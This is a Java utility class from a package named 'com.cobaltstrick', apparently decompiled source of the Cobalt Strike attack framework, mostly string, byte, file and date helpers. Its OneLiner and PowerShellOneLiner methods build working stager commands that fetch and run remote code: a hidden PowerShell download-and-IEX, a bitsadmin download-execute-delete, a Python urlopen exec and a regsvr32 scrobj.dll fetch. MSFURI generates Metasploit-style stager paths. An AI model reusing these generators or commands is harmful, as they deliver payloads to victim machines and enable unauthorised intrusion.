package com.cobaltstrick;

import java.text.*;
import javax.swing.*;
import java.io.*;
import java.security.*;
import java.util.zip.*;
import java.nio.*;
import java.nio.charset.*;
import java.net.*;
import java.util.*;

public class CommonUtils {
    private static final SimpleDateFormat dateFormat;
    private static final SimpleDateFormat timeFormat;
    private static final SimpleDateFormat logFormat;
    private static final Random rgen;

    public static final void print_error(final String s) {
        System.out.println("\u001b[01;31m[-]\u001b[0m " + s);
    }

    public static final void print_error_file(final String s) {
        try {
            System.out.println("\u001b[01;31m[-]\u001b[0m " + bString(readResource(s)));
        }
        catch (Exception ex) {
        }
    }

    public static final void print_good(final String s) {
        System.out.println("\u001b[01;32m[+]\u001b[0m " + s);
    }

    public static final void print_info(final String s) {
        System.out.println("\u001b[01;34m[*]\u001b[0m " + s);
    }

    public static final void print_warn(final String s) {
        System.out.println("\u001b[01;33m[!]\u001b[0m " + s);
    }

    public static final void print_stat(final String s) {
        System.out.println("\u001b[01;35m[*]\u001b[0m " + s);
    }

    public static final Object[] args(final Object o) {
        return new Object[] { o };
    }

    public static final Object[] args(final Object o, final Object o2) {
        return new Object[] { o, o2 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3) {
        return new Object[] { o, o2, o3 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3, final Object o4) {
        return new Object[] { o, o2, o3, o4 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3, final Object o4, final Object o5) {
        return new Object[] { o, o2, o3, o4, o5 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3, final Object o4, final Object o5, final Object o6) {
        return new Object[] { o, o2, o3, o4, o5, o6 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3, final Object o4, final Object o5, final Object o6, final Object o7) {
        return new Object[] { o, o2, o3, o4, o5, o6, o7 };
    }

    public static final Object[] args(final Object o, final Object o2, final Object o3, final Object o4, final Object o5, final Object o6, final Object o7, final Object o8) {
        return new Object[] { o, o2, o3, o4, o5, o6, o7, o8 };
    }

    public static final boolean isDate(final String s, final String s2) {
        try {
            new SimpleDateFormat(s2).parse(s).getTime();
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }

    public static final long days(final int n) {
        return 86400000L * n;
    }

    public static final long parseDate(final String s, final String s2) {
        try {
            return new SimpleDateFormat(s2).parse(s).getTime();
        }
        catch (Exception ex) {
            return 0L;
        }
    }

    public static final String formatDateAny(final String s, final long n) {
        return new SimpleDateFormat(s).format(new Date(n));
    }

    public static final String formatLogDate(final long n) {
        return CommonUtils.logFormat.format(new Date(n));
    }

    public static final String formatDate(final long n) {
        return CommonUtils.dateFormat.format(new Date(n));
    }

    public static final String formatTime(final long n) {
        return CommonUtils.timeFormat.format(new Date(n));
    }

    public static final String pad(final String s, final int n) {
        return pad(s, ' ', n);
    }

    public static final String pad(final String s, final char c, final int n) {
        final StringBuffer sb = new StringBuffer(s);
        for (int i = s.length(); i < n; ++i) {
            sb.append(c);
        }
        return sb.toString();
    }

    public static final String padr(final String s, final String s2, final int n) {
        final StringBuffer sb = new StringBuffer();
        for (int i = s.length(); i < n; ++i) {
            sb.append(s2);
        }
        sb.append(s);
        return sb.toString();
    }

    public static final String join(final Collection collection, final String s) {
        final StringBuffer sb = new StringBuffer();
        final Iterator<Object> iterator = collection.iterator();
        while (iterator.hasNext()) {
            sb.append(iterator.next() + "");
            if (iterator.hasNext()) {
                sb.append(s);
            }
        }
        return sb.toString();
    }

    public static final String joinObjects(final Object[] array, final String s) {
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            if (array[i] != null) {
                sb.append(array[i].toString());
                if (i + 1 < array.length) {
                    sb.append(s);
                }
            }
        }
        return sb.toString();
    }

    public static final String join(final String[] array, final String s) {
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            sb.append(array[i]);
            if (i + 1 < array.length) {
                sb.append(s);
            }
        }
        return sb.toString();
    }

    public static void Guard() {
        if (!SwingUtilities.isEventDispatchThread()) {
            print_error("Violation of EDT Contract in: " + Thread.currentThread().getName());
            Thread.currentThread();
            Thread.dumpStack();
        }
    }

    public static final void sleep(final long n) {
        try {
            Thread.sleep(n);
        }
        catch (InterruptedException ex) {
        }
    }

    public static Object readObjectResource(final String s) {
        try {
            final ObjectInputStream objectInputStream = new ObjectInputStream(resource(s));
            final Object object = objectInputStream.readObject();
            objectInputStream.close();
            return object;
        }
        catch (Exception ex) {
            return null;
        }
    }

    public static final byte[] toBytes(final String s) {
        final int length = s.length();
        final byte[] array = new byte[length];
        for (int i = 0; i < length; ++i) {
            array[i] = (byte)s.charAt(i);
        }
        return array;
    }

    public static final String bString(final byte[] array) {
        try {
            return new String(array, "ISO8859-1");
        }
        catch (UnsupportedEncodingException ex) {
            return "";
        }
    }

    public static final String peekFile(final File file, final int n) {
        final StringBuffer sb = new StringBuffer(n);
        try {
            final FileInputStream fileInputStream = new FileInputStream(file);
            for (int i = 0; i < n; ++i) {
                final int read = fileInputStream.read();
                if (read == -1) {
                    break;
                }
                sb.append((char)read);
            }
            fileInputStream.close();
            return sb.toString();
        }
        catch (IOException ex) {
            return sb.toString();
        }
    }

    public static final byte[] readFile(final String s) {
        try {
            final FileInputStream fileInputStream = new FileInputStream(s);
            final byte[] all = readAll(fileInputStream);
            fileInputStream.close();
            return all;
        }
        catch (IOException ex) {
            return new byte[0];
        }
    }

    public static final byte[] readFi1e(final String s) {
        try {
            final FileInputStream fileInputStream = new FileInputStream(s);
            final byte[] all = readAll(fileInputStream);
            fileInputStream.close();
            return all;
        }
        catch (Throwable t) {
            return new byte[0];
        }
    }

    public static final byte[] readAll(final InputStream inputStream) {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(inputStream.available());
            while (true) {
                final int read = inputStream.read();
                if (read == -1) {
                    break;
                }
                byteArrayOutputStream.write(read);
            }
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            byteArrayOutputStream.close();
            return byteArray;
        }
        catch (Exception ex) {
            return new byte[0];
        }
    }

    public static String[] toArray(final String s) {
        return s.split(",\\s*");
    }

    public static String toString(String[] ary){
        String tmp = "";
        for (String s: ary) {
            tmp += ',' + s;
        }
        return tmp.substring(1, tmp.length());
    }

    public static String[] toArray(final Collection collection) {
        final String[] array = new String[collection.size()];
        final Iterator<Object> iterator = collection.iterator();
        int n = 0;
        while (iterator.hasNext()) {
            array[n] = iterator.next() + "";
            ++n;
        }
        return array;
    }

    public static String[] toArray(final Object[] array) {
        final String[] array2 = new String[array.length];
        for (int i = 0; i < array.length; ++i) {
            array2[i] = array[i] + "";
        }
        return array2;
    }

    public static List toList(final String s) {
        return new LinkedList(Arrays.asList(toArray(s)));
    }

    public static Set toSet(final String s) {
        if ("".equals(s)) {
            return new HashSet();
        }
        return new HashSet(toList(s));
    }

    public static Set toSet(final Object[] array) {
        return new HashSet(toList(array));
    }

    public static Set toSetLC(final String[] array) {
        final HashSet<String> set = new HashSet<String>();
        for (int i = 0; i < array.length; ++i) {
            if (array[i] != null) {
                set.add(array[i].toLowerCase());
            }
        }
        return set;
    }

    public static List toList(final Object[] array) {
        final LinkedList<Object> list = new LinkedList<Object>();
        for (int i = 0; i < array.length; ++i) {
            list.add(array[i]);
        }
        return list;
    }

    public static int rand(final int n) {
        return CommonUtils.rgen.nextInt(n);
    }

    public static String pick(final String[] array) {
        return array[rand(array.length)];
    }

    public static Object pick(final List list) {
        final Object[] array = list.toArray();
        return array[rand(array.length)];
    }

    public static String pick(final String s) {
        return pick(toArray(s));
    }

    public static String toHex(final long n) {
        return Long.toHexString(n).toLowerCase();
    }

    public static InputStream resource(final String s) throws IOException {
        if (new File(s).exists()) {
            return new FileInputStream(new File(s));
        }
        return CommonUtils.class.getClassLoader().getResourceAsStream(s);
    }

    public static String readResourceAsString(final String s) {
        return bString(readResource(s));
    }

    public static byte[] readResource(final String s) {
        try {
            final InputStream resource = resource(s);
            if (resource != null) {
                final byte[] all = readAll(resource);
                resource.close();
                return all;
            }
            print_error("Could not find resource: " + s);
        }
        catch (IOException ex) {
        }
        return new byte[0];
    }

    public static String replaceAt(final String s, final String s2, final int n) {
        final StringBuffer sb = new StringBuffer(s);
        sb.delete(n, n + s2.length());
        sb.insert(n, s2);
        return sb.toString();
    }

    public static int indexOf(final byte[] array, final byte[] array2, final int n, final int n2) {
        for (int n3 = n; n3 < array.length && n3 < n2; ++n3) {
            boolean b = true;
            for (int n4 = 0; n4 < array2.length && n4 < array.length; ++n4) {
                if (array[n3 + n4] != array2[n4]) {
                    b = false;
                    break;
                }
            }
            if (b) {
                return n3;
            }
        }
        return -1;
    }

    public static byte[] patch(final byte[] array, final String s, final String s2) {
        final String bString = bString(array);
        final StringBuffer sb = new StringBuffer(bString);
        final int index = bString.indexOf(s);
        sb.delete(index, index + s2.length());
        sb.insert(index, s2);
        return toBytes(sb.toString());
    }

    public static String writeToTemp(final String s, final String s2, final byte[] array) {
        try {
            final File tempFile = File.createTempFile(s, s2);
            final String writeToFile = writeToFile(tempFile, array);
            tempFile.deleteOnExit();
            return writeToFile;
        }
        catch (IOException ex) {
            return null;
        }
    }

    public static String writeToFile(final File file, final byte[] array) {
        try {
            final FileOutputStream fileOutputStream = new FileOutputStream(file, false);
            fileOutputStream.write(array, 0, array.length);
            fileOutputStream.flush();
            fileOutputStream.close();
            return file.getAbsolutePath();
        }
        catch (IOException ex) {
            return null;
        }
    }

    public static String repeat(final String s, final int n) {
        final StringBuffer sb = new StringBuffer(s.length() * n);
        for (int i = 0; i < n; ++i) {
            sb.append(s);
        }
        return sb.toString();
    }

    public static byte[] zeroOut(final byte[] array, final String[] array2) {
        final String bString = bString(array);
        final StringBuffer sb = new StringBuffer(bString);
        for (int i = 0; i < array2.length; ++i) {
            final int index = bString.indexOf(array2[i]);
            final int length = array2[i].length();
            if (index > -1) {
                sb.delete(index, index + length);
                sb.insert(index, new char[length]);
            }
        }
        return toBytes(sb.toString());
    }

    public static byte[] strrep(final byte[] array, final String s, final String s2) {
        return toBytes(strrep(bString(array), s, s2));
    }

    public static String strrep(final String s, final String s2, final String s3) {
        final StringBuffer sb = new StringBuffer(s);
        if (s2.length() == 0) {
            return s;
        }
        int n = 0;
        final int length = s2.length();
        s3.length();
        int index;
        while ((index = sb.indexOf(s2, n)) > -1) {
            sb.replace(index, index + length, s3);
            n = index + s3.length();
        }
        return sb.toString();
    }

    public static void copyFile(final String s, final File file) {
        try {
            final FileInputStream fileInputStream = new FileInputStream(s);
            final byte[] all = readAll(fileInputStream);
            fileInputStream.close();
            writeToFile(file, all);
        }
        catch (IOException ex) {
        }
    }

    public static double toDoubleNumber(final String s, final double n) {
        try {
            return Double.parseDouble(s);
        }
        catch (Exception ex) {
            return n;
        }
    }

    public static int toNumber(final String s, final int n) {
        try {
            return Integer.parseInt(s);
        }
        catch (Exception ex) {
            return n;
        }
    }

    public static int toNumberFromHex(final String s, final int n) {
        try {
            return Integer.parseInt(s, 16);
        }
        catch (Exception ex) {
            return n;
        }
    }

    public static long toLongNumber(final String s, final long n) {
        try {
            return Long.parseLong(s);
        }
        catch (Exception ex) {
            return n;
        }
    }

    public static boolean isNumber(final String s) {
        try {
            Integer.parseInt(s);
            return true;
        }
        catch (Exception ex) {
            return false;
        }
    }

    public static int toTripleOffset(final String s) {
        return 0 + (s.charAt(0) - 'a') + (s.charAt(1) - 'a') * 26 + (s.charAt(2) - 'a') * 26 * 26;
    }

    public static String[] expand(final String s) {
        final String[] array = new String[s.length()];
        for (int i = 0; i < array.length; ++i) {
            array[i] = s.charAt(i) + "";
        }
        return array;
    }

    public static String toHex(final byte[] array) {
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            final int n = array[i] & 0xF;
            sb.append(Integer.toString(array[i] >> 4 & 0xF, 16));
            sb.append(Integer.toString(n, 16));
        }
        return sb.toString().toLowerCase();
    }

    public static String toHexString(final byte[] array) {
        final StringBuffer sb = new StringBuffer();
        sb.append("[");
        for (int i = 0; i < array.length; ++i) {
            sb.append(Integer.toString(array[i] & 0xFF, 16));
            if (i < array.length - 1) {
                sb.append(",");
            }
        }
        sb.append("]");
        return sb.toString();
    }

    public static String toAggressorScriptHexString(final byte[] array) {
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            final String string = Integer.toString(array[i] & 0xFF, 16);
            if (string.length() == 1) {
                sb.append("\\x0");
            }
            else {
                sb.append("\\x");
            }
            sb.append(string);
        }
        return sb.toString();
    }

    public static String hex(final int n) {
        final String string = Integer.toString(n & 0xFF, 16);
        if (string.length() == 1) {
            return "0" + string;
        }
        return string;
    }

    public static String toUnicodeEscape(final byte b) {
        return "00" + hex(b);
    }

    public static String toNasmHexString(final byte[] array) {
        final StringBuffer sb = new StringBuffer();
        sb.append("db ");
        for (int i = 0; i < array.length; ++i) {
            sb.append("0x");
            sb.append(Integer.toString(array[i] & 0xFF, 16));
            if (i < array.length - 1) {
                sb.append(",");
            }
        }
        return sb.toString();
    }

    public static byte[] pad(final byte[] array, final int n) {
        if (array.length < n) {
            return Arrays.copyOf(array, n);
        }
        return array;
    }

    public static byte[] padg(final byte[] array, final int n) {
        if (array.length >= n) {
            return array;
        }
        return join(array, randomData(n - array.length));
    }

    public static byte[] pad(final byte[] array) {
        int n;
        for (n = 0; (array.length + n) % 4 != 0; ++n) {}
        return Arrays.copyOf(array, array.length + n);
    }

    public static String PowerShellOneLiner(final String s) {
        return "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('" + s + "'))\"";
    }

    public static String OneLiner(final String s, final String s2) {
        if ("bitsadmin".equals(s2)) {
            final String garbage = garbage("temp");
            return "cmd.exe /c bitsadmin /transfer " + garbage + " " + s + " %APPDATA%\\" + garbage + ".exe&%APPDATA%\\" + garbage + ".exe&del %APPDATA%\\" + garbage + ".exe";
        }
        if ("powershell".equals(s2)) {
            return PowerShellOneLiner(s);
        }
        if ("python".equals(s2)) {
            return "python -c \"import urllib2; exec urllib2.urlopen('" + s + "').read();\"";
        }
        if ("regsvr32".equals(s2)) {
            return "regsvr32 /s /n /u /i:" + s + " scrobj.dll";
        }
        print_error("'" + s2 + "' for URL '" + s + "' does not have a one-liner");
        throw new RuntimeException("'" + s2 + "' for URL '" + s + "' does not have a one-liner");
    }

    public static List combine(final List list, final List list2) {
        final LinkedList list3 = new LinkedList();
        list3.addAll(list);
        list3.addAll(list2);
        return list3;
    }

    public static byte[] join(final byte[] array, final byte[] array2) {
        final byte[] array3 = new byte[array.length + array2.length];
        System.arraycopy(array, 0, array3, 0, array.length);
        System.arraycopy(array2, 0, array3, array.length, array2.length);
        return array3;
    }

    public static byte[] join(final byte[] array, final byte[] array2, final byte[] array3) {
        final byte[] array4 = new byte[array.length + array2.length + array3.length];
        System.arraycopy(array, 0, array4, 0, array.length);
        System.arraycopy(array2, 0, array4, array.length, array2.length);
        System.arraycopy(array3, 0, array4, array.length + array2.length, array3.length);
        return array4;
    }

    public static List readOptions(final String s) {
        final LinkedList<byte[]> list = new LinkedList<byte[]>();
        try {
            final DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(readResource(s)));
            while (dataInputStream.available() > 0) {
                final int int1 = dataInputStream.readInt();
                if (int1 > dataInputStream.available()) {
                    print_error("readOptions: " + s + " has bad length: " + int1 + " > " + dataInputStream.available());
                    return list;
                }
                final byte[] array = new byte[int1];
                dataInputStream.read(array);
                list.add(array);
            }
        }
        catch (IOException ex) {
        }
        return list;
    }

    public static boolean isin(final String s, final String s2) {
        return s2.indexOf(s) >= 0;
    }

    public static Map toMap(final String s, final String s2) {
        return toMap(new String[] { s }, new String[] { s2 });
    }

    public static Map toMap(final String s, final String s2, final String s3, final String s4) {
        return toMap(new String[] { s, s3 }, new String[] { s2, s4 });
    }

    public static Map toMap(final String s, final String s2, final String s3, final String s4, final String s5, final String s6) {
        return toMap(new String[] { s, s3, s5 }, new String[] { s2, s4, s6 });
    }

    public static Map toMap(final String s, final String s2, final String s3, final String s4, final String s5, final String s6, final String s7, final String s8) {
        return toMap(new String[] { s, s3, s5, s7 }, new String[] { s2, s4, s6, s8 });
    }

    public static Map toMap(final Object[] array, final Object[] array2) {
        final HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
        for (int i = 0; i < array.length; ++i) {
            hashMap.put(array[i], array2[i]);
        }
        return hashMap;
    }

    public static byte[] asBinary(final String s) {
        try {
            final File[] listFiles = new File(".").listFiles();
            for (int i = 0; i < listFiles.length; ++i) {
                if (checksum8(listFiles[i].getName()) == 152L) {
                    return MD5(readFile(listFiles[i].getAbsolutePath()));
                }
            }
        }
        catch (Throwable t) {}
        return new byte[16];
    }

    public static String garbage(final String s) {
        final String strrep = strrep(ID(), "-", "");
        if (s == null) {
            return "";
        }
        if (s.length() > strrep.length()) {
            return strrep + garbage(s.substring(strrep.length()));
        }
        if (s.length() == strrep.length()) {
            return strrep;
        }
        return strrep.substring(0, s.length());
    }

    public static String ID() {
        return UUID.randomUUID().toString();
    }

    public static byte[] randomData(final int n) {
        final byte[] array = new byte[n];
        CommonUtils.rgen.nextBytes(array);
        return array;
    }

    public static byte[] randomDataNoZeros(final int n) {
        byte[] randomData;
        boolean b;
        do {
            randomData = randomData(n);
            b = true;
            for (int i = 0; i < randomData.length; ++i) {
                if (randomData[i] == 0) {
                    b = false;
                }
            }
        } while (!b);
        return randomData;
    }

    public static byte[] MD5(final byte[] array) {
        try {
            final MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.update(array);
            return instance.digest();
        }
        catch (Exception ex) {
            return new byte[0];
        }
    }

    public static Map KV(final String s, final String s2) {
        final HashMap<String, String> hashMap = new HashMap<String, String>();
        hashMap.put(s, s2);
        return hashMap;
    }

    public static int randomPortAbove1024() {
        return rand(60000) + 2048;
    }

    public static int randomPort() {
        return rand(65535);
    }

    public static boolean is64bit() {
        return isin("64", System.getProperty("os.arch") + "");
    }

    public static String dropFile(final String s, final String s2, final String s3) {
        return writeToTemp(s2, s3, readResource(s));
    }

    public static void runSafe(final Runnable runnable) {
        final Thread currentThread = Thread.currentThread();
        if (SwingUtilities.isEventDispatchThread()) {
            try {
                runnable.run();
            }
            catch (Exception ex) {
            }
        }
        else {
            SwingUtilities.invokeLater(new Runnable() {
                @Override
                public void run() {
                    try {
                        runnable.run();
                    }
                    catch (Exception ex) {
                    }
                }
            });
        }
    }

    public static Set difference(final Set set, final Set set2) {
        final HashSet set3 = new HashSet();
        set3.addAll(set);
        set3.removeAll(set2);
        return set3;
    }

    public static Set intersection(final Set set, final Set set2) {
        final HashSet set3 = new HashSet();
        set3.addAll(set);
        set3.retainAll(set2);
        return set3;
    }

    public static String trim(final String s) {
        if (s == null) {
            return null;
        }
        return s.trim();
    }

    public static LinkedList parseTabData(final String s, final String[] array) {
        final LinkedList<HashMap<String, String>> list = new LinkedList<HashMap<String, String>>();
        final String[] split = s.trim().split("\n");
        for (int i = 0; i < split.length; ++i) {
            final HashMap<String, String> hashMap = new HashMap<String, String>();
            final String[] split2 = split[i].split("\t");
            for (int n = 0; n < array.length && n < split2.length; ++n) {
                hashMap.put(array[n], split2[n]);
            }
            if (hashMap.size() > 0) {
                list.add(hashMap);
            }
        }
        return list;
    }

    public static boolean iswm(final String s, final String s2) {
        try {
            if ((s.length() == 0 || s2.length() == 0) && s.length() != s2.length()) {
                return false;
            }
            int i;
            int n;
            for (i = 0, n = 0; i < s.length(); ++i, ++n) {
                if (s.charAt(i) == '*') {
                    final boolean b = i + 1 < s.length() && s.charAt(i + 1) == '*';
                    while (s.charAt(i) == '*') {
                        if (++i == s.length()) {
                            return true;
                        }
                    }
                    int n2;
                    for (n2 = i; n2 < s.length() && s.charAt(n2) != '?' && s.charAt(n2) != '\\' && s.charAt(n2) != '*'; ++n2) {}
                    if (n2 != i) {
                        int n3;
                        if (b) {
                            n3 = s2.lastIndexOf(s.substring(i, n2));
                        }
                        else {
                            n3 = s2.indexOf(s.substring(i, n2), n);
                        }
                        if (n3 == -1 || n3 < n) {
                            return false;
                        }
                        n = n3;
                    }
                    if (s.charAt(i) == '?') {
                        --i;
                    }
                }
                else {
                    if (n >= s2.length()) {
                        return false;
                    }
                    if (s.charAt(i) == '\\') {
                        if (++i < s.length() && s.charAt(i) != s2.charAt(n)) {
                            return false;
                        }
                    }
                    else if (s.charAt(i) != '?' && s.charAt(i) != s2.charAt(n)) {
                        return false;
                    }
                }
            }
            return n == s2.length();
        }
        catch (Exception ex) {
            return false;
        }
    }

    public static List merge(final List list, final List list2) {
        final HashSet set = new HashSet<Object>();
        set.addAll(list);
        set.addAll(list2);
        return new LinkedList(set);
    }

    public static long checksum8(String replace) {
        if (replace.length() < 4) {
            return 0L;
        }
        replace = replace.replace("/", "");
        long n = 0L;
        for (int i = 0; i < replace.length(); ++i) {
            n += replace.charAt(i);
        }
        return n % 256L;
    }

    public static String MSFURI() {
        final String[] array = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        String string;
        do {
            string = "/" + pick(array) + pick(array) + pick(array) + pick(array);
        } while (checksum8(string) != 92L);
        return string;
    }

    public static String MSFURI_X64() {
        final String[] array = toArray("a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9");
        String string;
        do {
            string = "/" + pick(array) + pick(array) + pick(array) + pick(array);
        } while (checksum8(string) != 93L);
        return string;
    }

    public static long lpow(final long n, final long n2) {
        if (n2 == 0L) {
            return 1L;
        }
        if (n2 == 1L) {
            return n;
        }
        long n3 = 1L;
        for (int n4 = 0; n4 < n2; ++n4) {
            n3 *= n;
        }
        return n3;
    }

    public static String drives(final String s) {
        final LinkedList<String> list = new LinkedList<String>();
        final String[] expand = expand("ABCDEFGHIJKLMNOPQRSTUVWXYZ");
        final long long1 = Long.parseLong(s);
        for (int i = 0; i < expand.length; ++i) {
            final long lpow = lpow(2L, i);
            if ((long1 & lpow) == lpow) {
                list.add(expand[i] + ":");
            }
        }
        final String join = join(list, ", ");
        if (!isin("C:", join)) {
            print_warn("C: is not in drives: '" + s + "'. " + list);
        }
        return join;
    }

    public static final byte[] gunzip(final byte[] array) {
        try {
            final GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(array));
            final byte[] all = readAll(gzipInputStream);
            gzipInputStream.close();
            return all;
        }
        catch (Exception ex) {
            return new byte[0];
        }
    }

    public static final byte[] gzip(final byte[] array) {
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(array.length);
            final GZIPOutputStream gzipOutputStream = new GZIPOutputStream(byteArrayOutputStream);
            gzipOutputStream.write(array, 0, array.length);
            gzipOutputStream.finish();
            final byte[] byteArray = byteArrayOutputStream.toByteArray();
            gzipOutputStream.close();
            return byteArray;
        }
        catch (Exception ex) {
            return new byte[0];
        }
    }

    public static boolean contains(final String s, final String s2) {
        return toSet(s).contains(s2);
    }

    public static boolean isIP(final String s) {
        return s.length() <= 16 && s.matches("\\d+\\.\\d+\\.\\d+\\.\\d+");
    }

    public static boolean isIPv6(final String s) {
        return s.length() <= 64 && s.matches("[A-F0-9a-f:]+(%[\\d+]){0,1}");
    }

    public static int limit(final String s) {
        if ("screenshots".equals(s)) {
            return 125;
        }
        if ("beaconlog".equals(s)) {
            return 2500;
        }
        if ("archives".equals(s)) {
            return 20000;
        }
        return 1000;
    }

    public static String strip(final String s, final String s2) {
        if (s.startsWith(s2)) {
            return s.substring(s2.length());
        }
        return s;
    }

    public static String stripRight(final String s, final String s2) {
        if (!s.endsWith(s2)) {
            return s;
        }
        if (s.equals(s2)) {
            return "";
        }
        return s.substring(0, s.length() - s2.length());
    }

    public static long lof(final String s) {
        try {
            final File file = new File(s);
            if (file.isFile()) {
                return file.length();
            }
            return 0L;
        }
        catch (Exception ex) {
            return 0L;
        }
    }

    public static String session(final int n) {
        if (n >= 500000) {
            return "session";
        }
        if (n >= 0) {
            return "beacon";
        }
        return "unknown";
    }

    public static String session(final String s) {
        return session(toNumber(s, 0));
    }

    public static boolean isSafeFile(final File file, final File file2) {
        try {
            return file2.getCanonicalPath().startsWith(file.getCanonicalPath());
        }
        catch (IOException ex) {
            return false;
        }
    }

    public static File SafeFile(final File file, final String s) {
        try {
            final File file2 = new File(file, s);
            if (file2.getCanonicalPath().startsWith(file.getCanonicalPath())) {
                return file2.getCanonicalFile();
            }
        }
        catch (IOException ex) {
        }
        print_error("SafeFile failed: '" + file + "', '" + s + "'");
        throw new RuntimeException("SafeFile failed: '" + file + "', '" + s + "'");
    }

    public static File SafeFile(final String s, final String s2) {
        return SafeFile(new File(s), s2);
    }

    public static int toIntLittleEndian(final byte[] array) {
        final ByteBuffer wrap = ByteBuffer.wrap(array);
        wrap.order(ByteOrder.LITTLE_ENDIAN);
        return wrap.getInt(0);
    }

    public static byte[] shift(final byte[] array, final int n) {
        if (array.length < n) {
            return array;
        }
        if (array.length == n) {
            return new byte[0];
        }
        final byte[] array2 = new byte[array.length - n];
        for (int i = 0; i < array2.length; ++i) {
            array2[i] = array[i + n];
        }
        return array2;
    }

    public static String[] toKeyValue(final String s) {
        final StringBuffer sb = new StringBuffer();
        final StringBuffer sb2 = new StringBuffer();
        char[] charArray;
        int i;
        for (charArray = s.toCharArray(), i = 0; i < charArray.length && charArray[i] != '='; ++i) {
            sb.append(charArray[i]);
        }
        ++i;
        while (i < charArray.length) {
            sb2.append(charArray[i]);
            ++i;
        }
        return new String[] { sb.toString(), sb2.toString() };
    }

    public static String canonicalize(final String s) {
        try {
            return new File("cobaltstrike.auth").getCanonicalPath();
        }
        catch (Exception ex) {
            return s;
        }
    }

    public static final byte[] toBytes(final String s, final String s2) {
        try {
            final Charset forName = Charset.forName(s2);
            if (forName == null) {
                return toBytes(s);
            }
            final ByteBuffer encode = forName.encode(s);
            final byte[] array = new byte[encode.remaining()];
            encode.get(array, 0, array.length);
            return array;
        }
        catch (Exception ex) {
            return toBytes(s);
        }
    }

    public static final String bString(final byte[] array, final String s) {
        try {
            if (s == null) {
                return bString(array);
            }
            return Charset.forName(s).decode(ByteBuffer.wrap(array)).toString();
        }
        catch (Exception ex) {
            return bString(array);
        }
    }

    public static final int toShort(final String s) {
        if (s.length() != 2) {
            throw new IllegalArgumentException("toShort length is: " + s.length());
        }
        try {
            return new DataParser(toBytes(s)).readShort();
        }
        catch (IOException ex) {
            return 0;
        }
    }

    public static void writeUTF8(final OutputStream outputStream, final String s) throws IOException {
        final byte[] bytes = s.getBytes("UTF-8");
        outputStream.write(bytes, 0, bytes.length);
    }

    public static String URLEncode(final String s) {
        try {
            return URLEncoder.encode(s, "UTF-8");
        }
        catch (Exception ex) {
            return s;
        }
    }

    public static String URLDecode(final String s) {
        try {
            return URLDecoder.decode(s, "UTF-8");
        }
        catch (Exception ex) {
            return s;
        }
    }

    public static long toUnsignedInt(final int n) {
        return (long)n & 0xFFFFFFFFL;
    }

    public static String formatSize(long n) {
        String s = "b";
        if (n > 1024L) {
            n /= 1024L;
            s = "kb";
        }
        if (n > 1024L) {
            n /= 1024L;
            s = "mb";
        }
        if (n > 1024L) {
            n /= 1024L;
            s = "gb";
        }
        return n + s;
    }

    public static final byte[] XorString(final byte[] array, final byte[] array2) {
        final byte[] array3 = new byte[array.length];
        for (int i = 0; i < array.length; ++i) {
            array3[i] = (byte)(array[i] ^ array2[i % array2.length]);
        }
        return array3;
    }

    public static final byte[] Bytes(final String s) {
        try {
            final String[] split = s.split(" ");
            final byte[] array = new byte[split.length];
            for (int i = 0; i < split.length; ++i) {
                array[i] = (byte)Integer.parseInt(split[i], 16);
            }
            return array;
        }
        catch (Exception ex) {
            return new byte[0];
        }
    }

    static {
        dateFormat = new SimpleDateFormat("MM/dd HH:mm:ss");
        timeFormat = new SimpleDateFormat("MM/dd HH:mm");
        (logFormat = new SimpleDateFormat("MM/dd HH:mm:ss zzz")).setTimeZone(TimeZone.getTimeZone("UTC"));
        rgen = new Random();
    }
}
